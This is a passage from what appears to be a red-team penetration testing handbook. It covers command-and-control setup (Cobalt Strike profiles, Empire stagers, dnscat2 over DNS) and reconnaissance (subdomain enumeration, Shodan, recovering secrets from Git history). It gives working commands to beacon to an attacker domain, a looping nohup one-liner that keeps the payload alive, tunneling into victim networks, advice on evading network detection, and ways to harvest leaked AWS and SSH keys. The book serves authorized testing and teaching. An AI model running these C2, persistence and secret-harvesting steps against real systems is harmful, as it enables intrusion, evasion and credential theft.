are going to be HTTP requests with URI paths:\nset uri \"/s/ref=nb_sb_noss_1/167-3294888-\n0262949/field-keywords=books\";\nThe host header is set to Amazon:\nheader \"Host\" \"www .amazon.com\";\nAnd even some custom Server headers are sent back from the\nC2 server\nheader \"x-amz-id-1\"\n\"THKUYEZKCKPGY5T42PZT\";\nheader \"x-amz-id-2\"\n\"a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9yd\nG5rZmRuZ2tmZGl4aHRvNDVpbgo=\";\n \nNow that these have been used in many different campaigns, numerous\nsecurity devices  have created signatures on all of the commo n Malleable\nProfiles (https://github.com/rsmudge/Malleable-C2-Profiles).  What we\nhave done to get around this is to make sure all the static  strings are\nmodified, make sure all User-Agent information is changed, configure SSL\nwith real certificates (don't use default Cobalt Strike SSL certificates), use\njitter, and change beacon times for the agents.  One last note is to make sure\nthe communicat ion happens over POST (http-post) commands as failing to\ndo so may cause a lot of headac he in using custom profiles.  If your profile\ncommunicates over http-get, it will still work, but uploading large files will\ntake forever.  Remember that GET is generally limited to around 2048\ncharacters.\n \nThe team at SpectorOps also created Randomized Malleable C2 Profiles\nusing: https://github.com/bluscreenofjef f/Malleable-C2-Randomizer .\nCobalt Strike Aggr essor Scripts\nCobalt Strike has numerous people contributing to the Cobalt Strike\nproject.  Aggressor Script is a scripting language for Red Team operations\nand adversary simulations inspi red by scriptable IRC clients and bots. Its\npurpose is two-fold: (1) You may create long running bots that simulate\nvirtual Red Team members, hacking side-by-side with you, (2) you may\nalso use it to extend and modify the Cobalt Strike client to your needs\n[https://www .cobaltstrike.com/aggressor -script/index.html].   For example,\nHarleyQu1nn has put together a great list of different aggressor scripts to\nuse with your post exploitation: http://bit.ly/2qxIwPE.\n \nPowerShell Empir e\nEmpire is a post-exploitation framework that includes a pure-PowerShell2.0\nWindows agent , and a pure Python 2.6/2.7 Linux/OS X agent. It is the\nmerge of the previous PowerShell Empire and Python EmPyre projects. The\nframework offers cryptologically-secure communications and a flexible\narchitecture. On the PowerShell side, Empire  implements the ability to run\nPowerShell agents without needing powershell.exe, rapidly deployable\npost-exploitation modules ranging from key loggers to Mimikatz, and\nadaptable communications to evade network detection, all wrapped up in a\nusability-focused framework [https://github.com/EmpireProject/Empire]. \n \nFor Red Teamer s, PowerShell is one of our best friends.  After the initial\npayload, all subsequent attacks are stored in memory .  The best part of\nEmpire is that it is actively maintained and updated so that all the latest\npost-exploitation modules are available for attacks.  They also have C2\nconnectivity for Linux and OS X.  So you can still create an Office Macro\nin Mac and, when executed, have a brand new agent in Empire.\n \nWe will cover Empire in more detail throughout the book so you can see\nhow effective it is.  In terms of setting up Empire, it is very important to\nensure you have configured it securely:\nSet the CertPath to a real trusted SSL certificate.\nChange the DefaultProfile endpoints.  Many layer 7 firewalls\nlook for the exact static endpoints.\nChange the User Agent used to communicate.\n \nJust like Metasp loit's rc files used for automation in the prior books, Empire\nnow supports autorun scripts for ef ficiency and ef fectiveness. \n \nRunning Empire:\nStarting up Empire\ncd /opt/Empire && ./setup/reset.sh\nExit\nexit\nSetup Up Cert (best practice is to use real trusted certs)\n./setup/cert.sh\nStart Empire\n./empire\nStart a Listener\nlisteners\nPick your listener (we'll use http for our labs)\nuselistener [tab twice to see all listener types]\nuselistener http\nView all configurations for the listener\ninfo\nSet the following (i.e. set KillDate 12/12/2020):\nKillDate - The end of your campaign so your agents\nautocleanup\nDefaultProfile - Make sure to change all the endpoints\n(i.e. /adm in/get.php,/news.php).   You can make them\nup however you want, such as\n/seriously/notmalware.php\nDefaultProfile - Make sure to also change your User\nAgent.  I like to look at the top User Agents used and\npick one of those.\nHost - Change to HTTPS and over port 443\nCertPath - Add your path to your SSL Certificates\nUserAgent - Change this to your common User Agent\nPort - Set to 443\nServerV ersion - Change this to another common\nServer Header\nWhen you are all done, start your listener\nexecute\n \n\nConfiguring the Payload\nThe payload is the actual malware that will run on the victim 's system. \nThese payloads can run in Windows, Linux, and OSX, but Empire is most\nwell-known for its PowerShell W indows Payloads:\nGo to the Main menu\nmain\nCreate stager available for OSX, W indows, Linux.  W e are going\nto create a simple batfile as an example, but you can create\nmacros for Of fice files or payloads for a rubber ducky\nusestager [tab twice to see all the dif ferent types]\nusestager windows/launcher_bat\nLook at all settings\ninfo\nConfigure All Settings\nset Listener http\nConfigure the UserAgent\nCreate Payload\ngenerate\nReview your payload in another terminal window\ncat /tmp/launcher .bat\n \n \nAs you can see, the payload that was created was heavily obfus cated.  You\ncan now drop this .bat file on any Windows system.  Of course , you would\nprobably create an Office Macro  or a Rubber Ducky payload, but this is just\none of many examples.\n \nIf you don't already have PowerShell installed on your Kali image, the best\nway to do so is to install it manually .  Installing PowerShell on Kali:\napt-get install libunwind8\nwget http://security .debian.or g/debian-\nsecurity/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-\n1+deb7u3_amd64.deb\ndpkg -i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb\nwget\nhttp://security .ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1\n-7ubuntu0.3_amd64.deb\ndpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb\nwget\nhttps://github.com/PowerShell/PowerShell/releases/download/v6\n.0.2/powershell_6.0.2-1.ubuntu.16.04_amd64.deb\ndpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb\n \ndnscat2\nThis tool is designed to create an encrypted Command and Control (C2)\nchannel over the DNS protocol,  which is an effective tunnel out of almost\nevery network [https://github.com/iagox86/dnscat2].\n \nC2 and exfiltrat ion over DNS provides a great mechanism to hide your\ntraffic, evade network sensors,  and get around network restrictions.  In\nmany restrictive or production environments, we come across networks that\neither do not allow outbound traffic or traffic that is heavily\nrestricted/monitored.  T o get around these protections, we can use a tool like\ndnscat2.  The reason we are focusing on dnscat2 is because it does not\nrequire root privileges and allows both shell access and exfiltration.\n \nIn many  secure environments, direct outbound UDP or TCP is restricted. \nWhy not leverage the services already built into the infrastructure?  Many\nof these protected networks contain a DNS server to resolve internal hosts,\nwhile also allowing resolutions of external resources.  By setting up an\nauthoritative server for a malicious domain we own, we can leverage these\nDNS resolutions to perform Command and Control of our malware.\n \n \nIn our scenario, we are going to set up our attacker domain called\n“loca1host.com”.  This is a doppelganger to “localhost” in the hopes that\nwe can hide our traffic a little bit more.  Make sure to replace\n“loca1host.com” to the domain name you own.  We are going to configure\nloca1host.com's DNS information so it becomes an Authoritative DNS\nserver .  In this example, we are going to use GoDaddy's DNS configuration\ntool, but you can use any DNS service.  \nSetting Up an Authoritative DNS Server using GoDaddy\nFirst, make sure to set up a VPS server to be your C2 attacking\nserver and get the IP of that server\nLog into your GoDaddy (or similar) account after purchasing a\ndomain\nSelect your domain, click manage, and select Advanced DNS\nNext, set up Hostnames in the DNS Management to point to\nyour Server\nns1 (and put the IP of your VPS server)\nns2 (and put the IP of your VPS server)\nEdit Nameservers to Custom\nAdd ns1.loca1host.com\nAdd ns2.loca1host.com\n \n \nAs seen in the image above, we now have our nameservers pointing to\nns1.loca1host.com and ns2.loca1host.com, which both point to our attacker\nVPS server.  If you try to resolve any subdomain for loca1host.com (i.e.\nvpn.loca1host.com), it will try to use our VPS server to perform those\nresolutions.  Luckily for us, dnscat2 listens on UDP port 53 and does all the\nheavy lifting for us.\n \nNext, we are going to need to fully set up our attacker server that is acting\nas our nameserver .  Setting up the dnscat2 Server:\nsudo su -\napt-get update\napt-get install ruby-dev\ngit clone https://github.com/iagox86/dnscat2.git\ncd dnscat2/server/\napt-get install gcc make\ngem install bundler\nbundle install\nTest to make sure it works: ruby ./dnscat2.rb\nQuick Note:  If you are using Amazon Lightsail, make sure to\nallow UDP port 53\n \nFor the client code, we will need to compile it to make a binary for a Linux\npayload. \nCompiling the Client\ngit clone https://github.com/iagox86/dnscat2.git\n/opt/dnscat2/client\ncd /opt/dnscat2/client/\nmake\nWe should now have a dnscat binary created! \n(If in W indows: Load client/win32/dnscat2.vcproj into V isual\nStudio and hit \"build\")\n \nNow that we have our authorit ative DNS configured, our attacker server\nrunning dnscat2 as a DNS server , and our malware compiled, we are ready\nto execute our payload.\n \nBefore we begin, we need to start dnscat on our attacker server .  Although\nthere are multiple configurations to enable, the main one is configuring the -\n-secret flag to make sure our communication within the DNS requests are\nencrypted.  Make sure to replace loca1host.com with the domai n name you\nown and create a random secret string.\n \nTo start the dncat2 on your attacker server:\nscreen\nruby ./dnscat2.rb loca1host.com --secret 39dfj3hdsfajh37e8c902j\n \nLet's say you have some sort of RCE on a vulnerable server .  You are able\nto run shell commands and upload our dnscat payload.  To execute our\npayload:\n./dnscat loca1host.com --secret 39dfj3hdsfajh37e8c902j\n \nThis will start dnscat, use our authoritative server , and create our C2\nchannel.  One thing I have seen is that there are times when dnscat2 dies. \nThis could be from large file transfers or something just gets messed up.  To\ncircumvent these types of issues, I like to make sure that my dnscat payload\nreturns.  For this, I generally like to start my dnscat payload with a quick\nbash script:\nnohup /bin/bash -c \"while true; do /opt/dnscat2/client/dnscat\nloca1host.com --secret 39dfj3hdsfajh37e8c902j --max-\nretransmits 5; sleep 3600; done\" > /dev/null 2>&1 &\n \nThis will make sure that if the client side payload dies for any reason, it will\nspawn a new instance every hour.  Sometimes you only have one chance to\nget your payloads to run, so you need to make them count!\n \nLastly , if you are going to run this payload on Windows, you could use the\ndnscat2 payload  or… why not just do it in PowerShell?!  Luke Baggett\nwrote up a PowerShell version of the dnscat client here:\nhttps://github.com/lukebaggett/dnscat2-powershell.  \nThe dnscat2 Connection\nAfter our payload executes and connects back to our attacker  server , we\nshould see a new ENCR YPTED AND VERIFIED message similar to\nbelow .  By typing \"window\" dnscat2 will show all of your sessions. \nCurrently , we have a single command session called \"1\".\n \n \nWe can spawn a terminal style shell by interacting with our command\nsession:\nInteract with our first command sessions\nwindow -i 1\nStart a shell sessions\nshell\nBack out to the main session\nCtrl-z\nInteract with the 2 session - sh\nwindow -i 2\nNow , you should be able to run all shell commands (i.e. ls)\n \n \nAlthough this isn't the fastest shell, due to the fact that all communication is\nover DNS, it really gets around those situations where a Meterpreter or\nsimilar shell just won't work.  What is even better about dnscat2 is that it\nfully supports tunneling.  This way, if we want to use an exploit from our\nhost system, use a browser to tunnel internal websites, or even SSH into\nanother box, it is all possible.\nTunnel in dnscat2\nThere are many times we want to route our traffic from our attacker server\nthrough our compromised host, to other internal servers.  The most secure\nway to do this with dnscat2 is to route our traffic through the local port and\nthen tunnel it to an internal system on the network.  An example of this can\nbe accomplished by the following command inside our command session:\nlisten 127.0.0.1:9999 10.100.100.1:22\n \nOnce the tunnel is created, we can go back to our root terminal  window on\nour attacker machine, SSH to localhost over port 9999, and authenticate to\nan internal system on the victim's network. \n \n \nThis will provide all sorts of fun and a great test to see if your customer's\nnetworks can detect massive DNS queries and exfiltration.  So, what do the\nrequest and responses look like?  A quick Wireshark dump shows that\ndnscat2 creates  massive amounts of different DNS requests to many\ndifferent long subdomains.\n \n \nNow , there are many other protocols that you might want to test.  For\nexample, Nishang has a PowerShell based ICM P Shell\n(http://bit.ly/2GXhdnZ) that uses https://github.com/inquisb/icm psh as the\nC2 server .  There are other ICMP shells like\nhttps://github.com/jamesbarlow/icmptunnel,\nhttps://github.com/DhavalKapil/icmptunnel and\nhttp://code.gerade.or g/hans/.\n \np0wnedShell\nAs stated on p0wnedShell’ s Github page, this tool is “an offensive\nPowerShell host application written in C# that does not rely on\npowershell.exe but runs powershell commands and functions within a\npowershell runspace environment (.NET). It has a lot of offensive\nPowerShell modules and binaries included to make the process of Post\nExploitation easier. What we tried was to build an “all in one” Post\nExploitation tool which we could use to bypass all mitigations solutions (or\nat least some off), and that has all relevant tooling included. You can use it\nto perform modern attacks withi n Active Directory environments and create\nawareness within your Blue team so they can build the right defense\nstrategies.” [https://github.com/Cn33liz/p0wnedShell] \n \nPupy Shell\nPupy is “an opensource, cross-platform (Windows, Linux, OSX, Android)\nremote administration and post-exploitation tool mainly written in python.”\n[https://github.com/n1nj4sec/pupy]. \n \nOne of the awesome features of Pupy is that you can run Pytho n across all\nof your agents without having a Python actually installed on all of your\nhosts.  So, if you are trying to script out a lot of your attacks in a custom\nframework, Pupy is an easy tool with which to do this.\n \nPoshC2\nPoshC2 is “a proxy aware C2 framework written completely in PowerShell\nto aid penetration testers with red teaming, post-exploitation  and lateral\nmovement. The tools and modules were developed off the back of our\nsuccessful PowerShell sessions and payload types for the Metasploit\nFramework. PowerShell was chosen as the base language as it provides all\nof the functiona lity and rich features required without needing to introduce\nmultiple languages to the framework.”\n[https://github.com/nettitude/PoshC2]\n \nMerlin\nMerlin (https://github.com/Ne0nd0g/merlin) takes advantage of a recently\ndeveloped protocol called HTTP/2 (RFC7540).  Per Medium, \"HTTP/2\ncommunications are multiplexed, bi-direction connections that do not end\nafter one request and response. Additionally , HTTP/2 is a binary protocol\nthat makes it more compact, easy to parse, and not human reada ble without\nthe use of an interpreting tool.”\n[https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a#df21]\n \nMerlin is a tool written in GO, looks and feels similar to PowerShell\nEmpire, and allows for a lightweight agent.  It doesn't support any types of\npost exploitation modules, so you will have to do it yourself. \n \nNishang\nNishang (https: //github.com/samratashok/nishang) is a framework and\ncollection of scripts and payloa ds which enables usage of PowerShell for\noffensive securi ty, penetration testing and Red Teaming. Nishang is useful\nduring all phases of penetration testing.\n \nAlthough Nisha ng is really a collection of amazing PowerShell scripts,\nthere are some scripts for lightweight Command and Control.\n \nConclusion\nNow , you are finally prepared to head into battle with all of your tools and\nservers configured.  Being ready for any scenario will help you get around\nany obstacle from network detection tools, blocked protocols,  host based\nsecurity tools, and more. \n \nFor the labs in this book, I have created a full Virtual Machin e based on\nKali Linux with all the tools.  This VMW are Virtual Machine can be found\nhere: http://thehackerplaybook.com/get.php?type=THP-vm .  Within the\nTHP archive, there is a text file named List_of_T ools.txt which lists all the\nadded tools.  The default username/password is the standard root/toor .\n \n \n \n2 before the snap - red team recon\n \n \n \n \nIn the last THP, the Before The Snap section focused on using different\ntools such as Recon-NG, Discover , Spiderfoot, Gitrob, Masscan, Sparta,\nHTTP Screenshot, Vulnerability Scanners, Burp Suite and more.  These\nwere tools that we could use either externally or internally to perform\nreconnaissance or scanning of our victim's infrastructure.  We are going to\ncontinue this tradition and expand on the reconnaissance phase from a Red\nTeam perspective. \n \nMonitoring an Environment\nFor Red Team campaigns, it is often about opportunity of attack .  Not only\ndo you need to have your attack infrastructure ready at a whim, but you also\nneed to be constantly looking  for vulnerabilities.  This could be done\nthrough various  tools that scan the environments, looking for services,\ncloud misconfig urations, and more.  These activities allow you to gather\nmore information about the victim’ s infrastructure and find immediate\navenues of attack.\nRegular Nmap Diffing\nFor all our clients, one of the first things we do is set up different\nmonitoring scrip ts.  These are usually just quick bash scripts that email us\ndaily diffs of a client's network .  Of course, prior to scanning, make sure\nyou have proper authorization to perform scanning.\n \nFor client networks that are generally not too large, we set up simple\ncronjob to perform external port diffing.  For example, we could create a\nquick Linux bash script to do the hard work (remember to replace the IP\nrange):\n#!/bin/bash\nmkdir /opt/nmap_dif f\nd=$(date +%Y -%m-%d)\ny=$(date -d yesterday +%Y -%m-%d)\n/usr/bin/nmap -T4 -oX /opt/nmap_dif f/scan_$d.xml\n10.100.100.0/24  > /dev/null 2>&1\nif [ -e /opt/nmap_dif f/scan_$y .xml ]; then\n    /usr/bin/ndif f /opt/nmap_dif f/scan_$y .xml\n/opt/nmap_dif f/scan_$d.xml > /opt/nmap_dif f/diff.txt\nfi\n \nThis is a very basic script that runs nmap every day using default ports and\nthen uses ndiff to compare the results.  We can then take the output of this\nscript and use it to notify our team of new ports discovered daily .\n \n \nIn the last book, we talked heavily about the benefits of Masscan\n(https://github.com/robertdavidgraham/masscan) and how much  faster it is\nthan nmap.  The developers of Masscan stated that, with a large enough\nnetwork pipeline , you could scan the entire internet in 6 minutes.  The one\nissue we have seen is with Masscan's reliability when scanning large\nranges.  It is great for doing our initial reconnaissance, but generally isn't\nused for dif fing.\n \nLab:\nLabs in THP3 are completely optional.  In some sections, I have included\naddition labs to perform testing or for areas that you can expan d on.  Since\nthis is all about learning and finding your own passion, I highly recommend\nyou spend the time to make our tools better and share it with the\ncommunity . \n \nBuild a better network dif f scanner:\nBuild a better port list than the default nmap (i.e. nmap defaul t\nmisses ports like Redis 6379/6380 and others)\nImplement nmap banners\nKeep historical tracking of ports\nBuild email alerting/notification system\nCheck out dif f Slack Alerts: http://bit.ly/2H1o5A W\nWeb Scr eenshots\nOther than regularly scanning for open ports/services, it is important for\nRed Teams to also monitor for different web applications.  We can use two\ntools to help monitor for application changes.\n \nThe first web screenshot tool that we commonly use is HTTP Screenshot\n(https://github.com/breenmachine/httpscreenshot).  The reason\nHTTPScreenshot is so powerful is that it uses Masscan to scan large\nnetworks quickly and uses phantomjs to take screencaptu res of any\nwebsites it detects.  This is a great way to get a quick layout of a large\ninternal or external network.\n \nPlease remember that all tool references in this book are run from the THP\nmodified Kali Virtual Machine.   You can find the Virtual Machine here: \nhttp://thehackerplaybook.com/get.php?type=THP-vm.   The username\npassword is the default: root/toor .\n \ncd /opt/httpscreenshot/\nEdit the networks.txt file to pick the network you want to scan:\ngedit networks.txt\n./masshttp.sh\nfirefox clusters.html\n \n \nThe other tool to check out is Eyewitness\n(https://github.com/ChrisT runcer/EyeW itness).    Eyewitness is another\ngreat tool that takes an XML  file from nmap output and screenshots\nwebpages, RDP servers, and VNC Servers.\n \nLab:\ncd /opt/EyeW itness\nnmap [IP Range]/24 --open -p 80,443 -oX scan.xml\npython ./EyeW itness.py -x scan.xml --web\n \n \nCloud Scanning\nAs more and more companies switch over to using different cloud\ninfrastructures, a lot of new and old attacks come to light.  This is usually\ndue to misconfigurations and a lack of knowledge on what exactly is\npublicly facing on their cloud infrastructure.  Regardless of Amazon EC2,\nAzure, Google cloud, or some other provider , this has become a global\ntrend.\n \nFor Red Teamers, a problem is how do we search on different cloud\nenvironments?  Since many tenants use dynamic IPs, their servers might not\nonly change rapidly , but they also aren’ t listed in a certain block on the\ncloud provider .  For example, if you use AWS, they own huge ranges all\nover the world.  Based on which region you pick, your server will randomly\nbe dropped into a /13 CIDR range.  For an outsider , finding and monitoring\nthese servers isn't easy .\n \nFirst, it is important to figure out where the IP ranges are owned by\ndifferent providers.  Some of the examples are:\nAmazon: http://bit.ly/2vUSjED\nAzure: http://bit.ly/2r7rHeR\nGoogle Cloud: http://bit.ly/2HAsZFm\n \nAs you can tell these ranges are huge and scanning them manually would be\nvery hard to do.  Throughout this chapter , we will be reviewing how we can\ngain the information on these cloud systems.\n \nNetwork/Service Sear ch Engines\nTo find cloud servers, there are many great resources freely available on the\ninternet to perform reconnaissance on our targets.  We can use everything\nfrom Google all the way to third party scanning services.  Using these\nresources will allow us to dig into a company and find information about\nservers, open services, banners,  and other details passively .  The company\nwill never know that you queri ed for this type of information .  Let’s see\nhow we use some of these resources as Red T eamers.\nShodan\nShodan (https://www .shodan.io)  is a great service that regularly scans the\ninternet, grabbing banners, ports, information about networks, and more. \nThey even have vulnerability information like Heartbleed.  One of the most\nfun uses for Shodan is looking through open web cams and playing around\nwith them.  From a Red Team perspective, we want to find information\nabout our victims.\n \nA Few Basic Search Queries:\ntitle: Search the content scraped from the HTML tag\nhtml: Search the full HTML content of the returned page\nproduct: Search the name of the software or product identified in\nthe banner\nnet: Search a given netblock (example: 204.51.94.79/18)\n \nWe can do some searches on Shodan for cyberspacekittens:\ncyberspacekittens.com\nSearch in the T itle HTML T ag\ntitle:cyberspacekittens\nSearch in the Context of the page\nhtml:cyberspacekittens.com\n \nNote, I have noticed that Shodan is a little slow in its scans.  It took more\nthan a month to get my servers scanned and put into the Shodan database.\n \nCensys.io\nCensys continu ally monitors every reachable server and device on the\nInternet, so you can search for and analyze them in real time. You will be\nable to understa nd your network attack surface, discover new threats, and\nassess their global impact [http s://censys.io/].  One of the best features of\nCensys is that it scrapes inform ation from SSL certificates.  Typically , one\nof the major difficulties for Red Teamers is finding where our victim's\nservers are located on cloud servers.  Luckily , we can use Censys.io to find\nthis information as they already parse this data. \n \nThe one issue we have with these scans is that they can someti me be days\nor weeks behind.  In this case, it took one day to get scanned for title\ninformation.  Additionally , after creating an SSL certificate on my site, it\ntook four days for the information to show up on the Censys.io site.  In\nterms of data accuracy , Censys.io was decently reliable. \n \nBelow , we ran scans to find info about our target cyberspacek ittens.com. \nBy parsing the server's SSL certificate, we were able to identify that our\nvictim's server was hosted on A WS.\n \n \n \nThere is also a Censys script tool to query it via a script ed process:\nhttps://github.com/christophetd/censys-subdomain-finder .\n \nManually Parsing SSL Certificates\nWe commonly find that compan ies do not realize what they have available\non the internet.  Especially with the increase of cloud usage, many\ncompanies do not have ACLs properly implemented.  They believe that\ntheir servers are protected, but we discover that they are publicly facing. \nThese include Redis databases, Jenkin servers, Tomcat management,\nNoSQL database s, and more – many of which led to remote code execution\nor loss of PII. \n \nThe cheap and dirty way to find these cloud servers is by manually\nscanning SSL certificates on the internet in an automated fashi on.  We can\ntake the list of IP ranges for our cloud providers and scan all of them\nregularly to pull down SSL certificates.  Looking at the SSL certs, we can\nlearn a great deal about an organization.  From the scan below of the\ncyberspacekittens range, we can see hostnames in certificates with .int. for\ninternal servers, .dev. for development, vpn. for VPN servers, and more. \nMany times you can gain intern al hostnames that might not have public IPs\nor whitelisted IPs for their internal networks.\n \nTo assist in scanning for hostnames in certificates, sslScrape was developed\nfor THP 3.  This tool utilizes Masscan to quickly scan large networks.  Once\nit identifies services on port 443, it then strips the hostnames in the\ncertificates.\n \nsslScrape (https://github.com/cheetz/sslScrape):\ncd /opt/sslScrape\npython ./sslScrape.py [IP Address  CIDR Range]\n \n\n \nExamples of Cloud IP Addresses:\nAmazon: http://bit.ly/2vUSjED\nAzure: http://bit.ly/2r7rHeR\nGoogle Cloud: http://bit.ly/2HAsZFm\n \nThroughout this book, I try to provide examples and an initial framework. \nHowever , it is up to you to develop this further .  I highly recommend you\ntake this code as a start, save all hostnames to a database, make a web UI\nfrontend, conne ct additional ports that might have certs like 8443, and\nmaybe even look for some vulnerabilities like .git/.svn style repos.\n \nSubdomain Discovery\nIn terms of identifying IP ranges, we can normally look up the company\nfrom public sources like the American Registry for Interne t Numbers\n(ARIN) at https://www .arin.net /.  We can look up IP addre ss space to\nowners, search Networks owned by companies, Autonomo us System\nNumbers by organization, and more.  If we are looking outside North\nAmerica, we can look up via AFRINIC (Africa), APNIC (Asia ), LACNIC\n(Latin America), and RIPE NCC (Europe).  These are all publicly available\nand listed on their servers. \n \nYou can look up any hostname or FQDN to find the owner of that domain\nthrough many available public  sources (one of my favorites to quickly\nlookup ownership is https://cen tralops.net/co/domaindossier .aspx).  What\nyou can't find listed anywhere are subdomains.  Subdomain information is\nstored on the target's DNS server versus registered on some central public\nregistration system.  You have to know what to search for to find a valid\nsubdomain. \n \nWhy are subdomains so important to find for your victim targets?  A few\nreasons are:\nSome subdomains can indicate the type of server it is (i.e. dev,\nvpn, mail, internal, test).  For example ,\nmail.cyberspacekittens.com.\nSome servers do not respond by IP.  They could be on shared\ninfrastructure and only respond by fully qualified domains.  This\nis very common  to find on cloud infrastructure.  So you can\nnmap all day, but if you can’t find the subdomain, you won' t\nreally know what applications are behind that IP .\nSubdomains can provide information about where the target is\nhosting their servers.  This is done by finding all of a company's\nsubdomains, performing reverse  lookups, and finding where the\nIPs are hosted.   A company could be using multiple cloud\nproviders and datacenters.\n \nWe did a lot of discovery in the last book, so let's review some of the\ncurrent and new tools to perform better discovery .  Feel free to join in and\nscan the cyberspacekittens.com domain.\nDiscover Scripts\nDiscover Scripts (https://github.com/leebaird/discover) tool is still one of\nmy favorite recon/discovery tools discussed in the last book.  This is\nbecause it combines all the recon tools on Kali Linux and is maintained\nregularly .  The passive domain recon will utilize all the following tools:\nPassive uses ARIN, dnsrecon, goofile, goog-mail, goohost, theHarvester ,\nMetasploit, URLCrazy , Whois, multiple websites, and recon-ng.\ngit clone https://github.com/leebaird/discover /opt/discover/\ncd /opt/discover/\n./update.sh\n./discover .sh\nDomain\nPassive\n[Company Name]\n[Domain Name]\nfirefox /root/data/[Domain]/index.htm\n \nThe best part of Discover scripts is that it takes the information it gathers\nand keeps searching based on that information.  For example, from\nsearching through the public PGP repository it might identify emails and\nthen use that information to search Have I Been Pwned (through Recon-\nNG).  That will let us know if any passwords have been found through\npublicly-released compromises (which you will have to find on your own).\nKNOCK\nNext, we want to get a good idea of all the servers and domains a company\nmight use.  Although there isn’t a central place where subd omains are\nstored, we can bruteforce different subdomains with a tool, such as Knock,\nto identify what servers or hosts might be available for attack.\n \nKnockpy is a python tool designed to enumerate subdomains on a target\ndomain through a wordlist.\n \nKnock is a great subdomain scan tool that takes a list of subdomains and\nchecks it to see if it resolves.  So if you have cyberspacekittens.com, Knock\nwill take this wordlist (http://bit.ly/2JOkUyj), and see if there are any\nsubdomains for [subdomain].cyberspacekittens.com.  Now , the one caveat\nhere is that it is only as good as your word list.  Therefore, having a better\nwordlist increases your chances of finding subdomains. \n \nOne of my favorite subdomains  is created by jhaddix and is located here:\nhttp://bit.ly/2qwxrxB.  Subdomains are one of those things that you should\nalways be collecting.  Some other good lists can be found on your THP Kali\nimage under /opt/SecLists or here:\nhttps://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS. \n \nLab: \nFind all the subdomains for cyberspacekittens.com:\ncd /opt/knock/knockpy\npython ./knockpy .py cyberspacekittens.com\nThis uses the basic wordlist from Knock.  T ry downloading and\nusing a much lar ger wordlist.  T ry using the\nhttp://bit.ly/2qwxrxB list using the -u switch.  (i.e. python\n./knockpy .py cyberspacekittens.com -u all.txt).\n \nWhat types of differences did you find from Discover scripts?  What types\nof domains would be your first targets for attacks or used with\nspearphishing domain attacks? Go and give it a try in the real world.  Go\nfind a bug bounty program and look for juicy-looking subdomains.\nSublist3r\nAs previously mentioned, the problem with Knock is that it is only as good\nas your wordlist .  Some companies have very unique subdomai ns that can't\nbe found through a common wordlist.  The next best resource to go to are\nsearch engines.  As sites get spidered, files with links get analyzed and\nscraped public resources become available, which means we can use search\nengines to do the hard work for us. \n \nThis is where we can use a tool like Sublist3r .  Note, using a tool like this\nuses different \"google dork\" style search queries that can look like a bot. \nThis could get you temporarily  blacklisted and require you to fill out a\ncaptcha with every request, whic h may limit the results from your scan.  To\nrun Sublister:\ncd /opt/Sublist3r\npython sublist3r .py -d cyberspacekittens.com -o\ncyberspacekittens.com\n \nNotice any results that might have never been found from subdomain\nbruteforcing?  Again, try this against a bug bounty program to see\nsignificant dif ferences between bruteforcing and using search engines.\n \n*There is a forked version of Sublist3r that also performs subdomain\nchecking: https://github.com/Plazmaz/Sublist3r .\nSubBrute\nThe last subdomain tool is called SubBrute.  SubBrute is a community-\ndriven project with the goal of creating the fastest, and most accurate\nsubdomain enumeration tool. Some of the magic behind SubBrute is that it\nuses open resolvers as a kind of proxy to circumvent DNS rate-limiting\n(https://www .us-cert.gov/ncas/alerts/T A13-088A). This design also\nprovides a layer of anonymity , as SubBrute does not send traffic directly to\nthe tar get's name servers. [https://github.com/TheRook/subbrute]\n \nNot only is SubBrute extremely fast, it performs a DNS spider feature that\ncrawls enumerated DNSrecords.  T o run SubBrute:\ncd /opt/subbrute\n./subbrute.py cyberspacekittens.com\n \nWe can also take SubBrute to the next level and combine it with MassDNS\nto perform very high-performance DNS resolution (http://bit.ly/2EMKIHg).\nGithub\nGithub is a treasure trove of amazing data.  There have been a number of\npenetration tests and Red Team assessments where we were able to get\npasswords, API keys, old sourc e code, internal hostnames/IPs,  and more. \nThese either led to a direct compromise or assisted in another attack.  What\nwe see is that many developers either push code to the wrong repo (sending\nit to their public  repository instead of their company’ s private repository),\nor accidentally push sensitive material (like passwords) and then try to\nremove it.  One good thing with Github is that it tracks every time code is\nmodified or deleted.  That means if sensitive code at one time was pushed\nto a repository and that sensitive file is deleted, it is still tracked in the code\nchanges.  As long as the repository is public, you will be able to view all of\nthese changes. \n \nWe can either use Github search to identify certain\nhostnames/or ganizational names or even just use simple Google Dork\nsearch, for example:\nsite:github.com + \"cyberspacekittens”. \n \nTry searching bug bounty progr ams using different organizations instead of\nsearching for cyberspacekittens for the following examples.\n \nThrough all your searching, you come across:\nhttps://github.com/cyberspacekittens/dnscat2 (modified example for GitHub\nlab).  You can manually take a peek at this repository , but usually it will be\nso large that you will have a hard time going through all of the projects to\nfind anything juicy . \n \nAs mentioned before, when you edit or delete a file in Github, everything is\ntracked.  Fortunately for Red Teamers, many people forget about this\nfeature. Therefo re, we often see people put sensitive information into\nGithub, delete it, and not realize it's still there!  Let's see if we can find\nsome of these gems.\nTruffle Hog\nTruffle Hog tool scans different commit histories and branches for high\nentropy keys, and prints them.  This is great for finding secrets,  passwords,\nkeys, and more.  Let's see if we can find any secrets on cybers pacekittens'\nGithub repository .\nLab:\ncd /opt/truf flehog/truf fleHog\npython truf fleHog.py\nhttps://github.com/cyberspacekittens/dnscat2\n \n \nAs we can see in the commit history , AWS keys and SSH keys were\nremoved from server/controller/csk.config, but if you look at the current\nrepo, you won't find this file:\nhttps://github.com/cheetz/dnscat2/tree/master/server/controller . \n \nEven better (but a little more complicated to set up) is git-all-secrets from\n(https://github.com/anshumanbh/git-all-secrets).  Git-all-secrets is useful\nwhen looking through large organizations.  You can just point to an\norganization and have it clone the code locally , then scan it with T ruffle-hog\nand repo-supervisor .  You will first need to create a Github Access Token,\nwhich is free by creating a Githu b and selecting Generate New Token in the\nsettings. \n \nTo run git-all-secrets:\ncd /opt/git-all-secrets\ndocker run -it abhartiya/tools_gitallsecrets:v3 -\nrepoURL=https://github.com/cyberspacekittens/dnscat2 -token=\n[API Key] -output=results.txt\nThis will clone the repo and start scanning.  Y ou can even run\nthrough whole or ganizations in Github with the -or g flag.\nAfter the container finishes running, 